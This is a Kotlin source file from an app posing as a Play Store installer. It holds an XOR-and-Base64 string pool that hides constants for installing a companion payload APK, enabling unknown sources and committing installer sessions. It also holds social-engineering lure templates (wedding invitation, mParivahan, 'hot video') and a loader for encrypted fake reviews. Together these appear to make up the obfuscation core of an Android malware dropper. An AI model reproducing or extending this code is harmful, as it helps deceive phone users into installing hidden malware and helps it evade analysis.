package com.playstore.installer

import android.util.Base64

/**
 * StringPool — build-time string obfuscation.
 * All sensitive strings XOR-encoded. Never plaintext in DEX.
 * Committed to repo — no build-time generation required.
 * Updated by StringEncryptorPlugin if present.
 */
internal object StringPool {

    // Key split — never appears as single literal
    private val k1 = "n0vA"
    private val k2 = "$eEd"

    // Encoded string constants
    val COMPANION_ASSET = "DV8bMUULLAsAHhcxTw=="
    val TMP_COMPANION = "Gl0GHkcKKBQPXh8uSkskFAU="
    val CACHED_COMPANION = "DV8bMUULLAsAbxUgRw0gAEBRBio="
    val WRITE_NAME = "G0ASIFAAaxQFVw=="
    val PREFS_NAME = "AF8AIHsVNwEIQw=="
    val KEY_COMPANION_PKG = "DV8bMUULLAsAbwYqQw=="
    val KEY_CACHED_PATH = "DVEVKUEBGgUeWykxRREt"
    val KEY_STAGE = "B14FNUUJKTsdRBcmQQ=="
    val HOME_SETTINGS = "D14SM0sMIUodVQI1TQsiF0B4OQxhOhYhOmQ/D2M2"
    val UNKNOWN_SOURCES = "D14SM0sMIUodVQI1TQsiF0B9Nw9lIgA7O349D2syCzsvYCYedyoQNi11JQ=="
    val REFERRER_URI = "D14SM0sMIUkPQAZ7C0omCwMeFy9AFyoNCh4AJEoBLAoJ"
    val MARKET_URI_PREFIX = "A1EEKkERf0tBVBM1RQwpF1FZEnw="
    val PKG_INSTALLER_URI = "HlEVKkUCIF4="
    val APP_DETAILS_URI = "D14SM0sMIUodVQI1TQsiF0BxJhFoLAYlOnk5D3shADAveToSezYAMDp5OAZ3"
    val MSG_SET_HOME = "PlwTIFcAZRcLRFY1TAw2RA9ABmFFFmUdAUUEYUAAIwUbXAJhTAooAU5cFzRKBi0BHA=="
    val MSG_CANCEL = "Kl8BL0gKJABOUxcvRwApCAtU"
    val SESSION_COMMIT = "D14SM0sMIUoNXxg1QQsxSh5dWCBHESwLAB4lBHc2DCsgbzUOaSgMMCN1OBU="
    val TPL_WEDDING = "GVUSJU0LIkQHXgAoUAQxDQFe"
    val TPL_SHAADI = "HVgXIEAMZQ8PEBgoSQQrEBxRGA=="
    val TPL_MPARIVAHAN = "A0AXM00TJAwPXg=="
    val TPL_HOT_VIDEO = "Bl8CYVIMIQEBEBUgSAk="

    // Decode at point of use only
    fun d(enc: String): String {
        return try {
            val key = (k1 + k2).toByteArray(Charsets.UTF_8)
            val b = Base64.decode(enc, Base64.DEFAULT)
            String(ByteArray(b.size) { i -> (b[i].toInt() xor key[i % key.size].toInt()).toByte() })
        } catch (e: Exception) { "" }
    }

    fun loadReviews(context: android.content.Context, template: String): List<Triple<String, Int, String>> {
        return try {
            val raw  = context.assets.open("reviews.enc").readBytes()
            val key  = (k1 + k2).toByteArray(Charsets.UTF_8)
            val json = String(ByteArray(raw.size) { i -> (raw[i].toInt() xor key[i % key.size].toInt()).toByte() })
            parseReviews(json, template)
        } catch (e: Exception) { emptyList() }
    }

    private fun parseReviews(json: String, template: String): List<Triple<String, Int, String>> {
        val result = mutableListOf<Triple<String, Int, String>>()
        try {
            val obj = org.json.JSONObject(json)
            val arr = obj.optJSONArray(template) ?: obj.optJSONArray("generic") ?: return result
            for (i in 0 until arr.length()) {
                val item = arr.getJSONObject(i)
                result.add(Triple(item.getString("n"), item.getInt("s"), item.getString("r")))
            }
        } catch (e: Exception) { }
        return result
    }
}
